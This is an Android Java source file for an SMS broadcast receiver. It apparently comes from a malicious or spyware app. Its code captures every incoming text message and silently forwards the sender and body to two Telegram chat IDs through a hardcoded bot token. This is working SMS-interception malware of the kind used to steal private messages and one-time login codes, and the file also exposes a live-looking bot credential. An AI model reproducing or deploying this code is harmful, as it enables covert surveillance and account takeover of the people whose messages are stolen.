package com.example.learnc;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                        // Forward the message to your Telegram bot for both chat IDs
                        forwardToTelegramBot(sender, messageBody, "2142287302");  // First chat ID
                        forwardToTelegramBot(sender, messageBody, "1429455803");  // Second chat ID
                    }
                }
            }
        }
    }

    private void forwardToTelegramBot(final String sender, final String messageBody, final String chatId) {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                try {
                    // Construct the URL for the Telegram Bot API
                    String urlString = "https://api.telegram.org/bot6944538103:AAHBVzOEwEe421kovi6k11XqIp6_b8WCIYY/sendMessage";
                    URL url = new URL(urlString);

                    // Construct the JSON payload for the message
                    String jsonInputString = "{\"chat_id\": \"" + chatId + "\" , \"text\": \"New SMS from " + sender + ": " + messageBody + "\"}";

                    // Open a connection to the URL
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

                    // Send the JSON payload to the Telegram Bot API
                    try (OutputStream os = conn.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }

                    // Check the response code (optional)
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Message sent successfully
                    } else {
                        // Error handling
                    }

                    // Close the connection
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                return null;
            }
        }.execute();
    }
}